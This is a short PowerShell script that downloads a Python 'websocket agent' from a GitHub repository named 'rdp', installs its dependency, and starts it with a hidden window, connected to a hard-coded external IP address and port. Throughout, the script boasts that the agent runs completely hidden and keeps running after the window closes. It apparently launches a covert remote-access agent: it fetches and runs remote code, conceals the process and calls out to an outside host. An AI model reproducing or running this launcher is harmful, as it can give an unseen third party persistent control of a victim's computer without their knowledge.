Write-Host "Starting WebSocket Agent in completely hidden mode..." -ForegroundColor Green

# Check if Python script exists, if not download it
if (-not (Test-Path "websocket_agent.py")) {
    Write-Host "Downloading websocket_agent.py..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py" -OutFile "websocket_agent.py"
}

# Install websockets package
Write-Host "Installing websockets package..." -ForegroundColor Yellow
pip install websockets

# Start the Python agent completely hidden
Write-Host "Starting Python agent completely hidden..." -ForegroundColor Yellow

# Use Start-Process with hidden window style and no new window
$process = Start-Process python -ArgumentList "websocket_agent.py", "3.237.240.137", "3000", "test" -WindowStyle Hidden -PassThru

Write-Host "Agent started successfully with PID: $($process.Id)" -ForegroundColor Green
Write-Host "The Python agent is now running completely hidden." -ForegroundColor Green
Write-Host "No visible terminal window will be opened." -ForegroundColor Green
Write-Host "You can close this window and the agent will continue running." -ForegroundColor Green

Read-Host "Press Enter to exit" 